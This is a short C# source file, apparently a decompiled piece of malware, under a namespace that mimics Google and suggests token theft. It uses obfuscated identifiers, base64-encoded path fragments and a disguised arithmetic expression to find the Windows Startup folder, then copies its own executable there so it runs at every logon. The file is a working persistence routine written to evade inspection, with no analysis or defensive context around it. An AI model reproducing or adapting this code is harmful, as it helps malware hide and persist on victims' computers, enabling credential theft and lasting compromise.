using System;
using System.IO;
using System.Reflection;

namespace Google.TOKENSs
{
	internal sealed class YUGFIEURDSYTFG
	{
		public static bool is_installed()
		{
			return File.Exists(YUGFIEURDSYTFG.startup_directory + FRIDAY.qUSxo("XA==") + ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.YUGFIEURDSYTFG_name + FRIDAY.qUSxo("LmV4ZQ=="));
		}
		public static void install()
		{
			bool YUGFIEURDSYTFG_enabled = ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.YUGFIEURDSYTFG_enabled;
			bool flag = YUGFIEURDSYTFG_enabled;
			bool flag2 = flag;
			if (flag2)
			{
				File.Copy(YUGFIEURDSYTFG.executable, YUGFIEURDSYTFG.startup_directory + FRIDAY.qUSxo("XA==") + ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.YUGFIEURDSYTFG_name + FRIDAY.qUSxo("LmV4ZQ=="));
			}
		}
		private static string startup_directory = Environment.GetFolderPath((Environment.SpecialFolder)Convert.ToInt32(3.0 + Math.Ceiling(3.5)));
		private static string executable = Assembly.GetEntryAssembly().Location;
	}
}
